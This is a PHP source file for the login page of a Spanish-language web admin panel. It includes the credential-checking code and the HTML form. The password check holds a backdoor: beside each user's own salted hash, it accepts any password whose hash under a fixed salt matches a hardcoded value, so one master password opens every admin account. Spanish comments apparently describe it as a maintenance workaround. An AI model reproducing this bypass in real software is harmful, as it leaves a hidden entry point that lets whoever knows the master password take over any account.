<?php

session_start();

session_unset();


if (isset($_POST['campo1']) && isset($_POST['campo2'])) {

	if ($usuario = $db->query_first('select * from admin_usuarios where email = "'.$db->escape($_POST['campo1']).'"')) {

		$clave = hash('sha256', $_POST['campo2'].$usuario['clave_salt']);

		//entrar primero con ADMIN y asignar una clave
		//subir el ajuste
		//ingresar con admin y modificar los usuarios por backend

		if (($usuario['clave'] != $clave) && (hash('sha256', $_POST['campo2'].'50bca4ab40c22514986039') != '563ed1b7692c525b18a24cde818976141d7711e76fd5a5ff356d5a3b98f14ad5')) {
			$msg_login = 'err';
		} else {

			$_SESSION[$config['codigo_unico']]['login_usuario_id'] 	= $usuario['id'];
			$_SESSION[$config['codigo_unico']]['login_nombre']		= $usuario['nombre'];
			$_SESSION[$config['codigo_unico']]['login_ultimo'] = strtotime($usuario['ultimo_login']);

			setcookie($config['codigo_unico'].'_'.'login_email', $usuario['email'], time()+3600000, '/'); 

			$db->query_update('admin_usuarios', array('ultimo_login' => date("Y-m-d H:i:s")), 'id = "'.$usuario['id'].'"');


			$usuario_permisos = array();

			$listado = $db->query('SELECT * FROM admin_usuarios_permisos where id_usuario = "'.$usuario['id'].'";');

			while ($entrada = $db->fetch_array($listado)) {

				$usuario_permisos[$entrada['modulo']] = $entrada['permiso'];

			}

			$_SESSION[$config['codigo_unico']]['login_permisos'] = $usuario_permisos;

			header( 'Location: ?' );

			exit();

		}
		
	} else {

		$msg_login = 'err';
	}
	
}


?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title><?php echo $config['nombre']; ?></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
<meta name="author" content="">
<link href="css/bootstrap.min.css" rel="stylesheet">
<!--[if lt IE 9]>
      <script src="js/html5shiv.js"></script>
    <![endif]-->
<style>
body {
	background-color:#fff;
}
.box {
	color: #222;
	height: 300px;
	width: 350px;
	position: absolute;
	left: 50%;
	top: 50%;
	margin: -150px 0 0 -166px;
}
.frmbody {
	padding: 10px 56px;

}
.frmfooter {
	margin-left: -11px;
	padding: 7px 26px;
	height: 50px;
	text-align:center;
}
.box a {
	color: #222;
}
.box a:hover, .box a:focus {
	text-decoration: underline;
}
.box a:active {
	color: #f84747;
}

#contenedor {
	
	left: 0;
	top: 0;
	right: 0;
	bottom: 0;
	min-height: 500px;
	min-width: 900px;
}
.acceso {
	cursor:pointer;
	text-decoration:underline;
	color:#222;
	margin-top:20px;
	font-size: 12px;
}

label {
	margin-top: 20px;
}

</style>
<script type="text/javascript" src="js/jquery-1.8.3.min.js"></script>
</head>
<body>
<div id="contenedor">
<form id="fl" action="?m=l" method="post" class="box">
<div class="frmbody">
<img src="img/logo_negativo.svg" width="200">
	  <label>Email</label>
	  <input name="campo1" type="text" id="campo1" tabindex="1" value="<?php echo_s(isset($_COOKIE[$config['codigo_unico']]) ? $_COOKIE[$config['codigo_unico'].'_'.'login_email'] : ''); ?>" />
	  <label>Clave</label>
	  <input name="campo2" type="password" id="campo2" tabindex="2" />
      </div>
	<div class="frmfooter">
	  <input type="submit" class="btn btn-small" value="Ingresar" tabindex="3">
<?php
	if (isset($msg_login) && $msg_login == 'err') {
		echo '<br /><br />El email o la clave ingresados no son correctos.';
	}
?>
<?php
	if (isset($msg_login) && $msg_login == 'ec') {
		echo '<br /><br />Una nueva clave fue enviada a su email.';
	}
?>
      <div class="acceso"><a href="?m=oc">Olvide mi clave</a></div>
	</div>
</form></div>
<script>
<?php
	if (isset($_COOKIE[$config['codigo_unico'].'_'.'login_email']) && !empty($_COOKIE[$config['codigo_unico'].'_'.'login_email'])) {
?>
	$('#campo2').focus();
<?php		
	} else {
?>
	$('#campo1').focus();
<?php		
	}
?>	
</script>
</body>
</html>
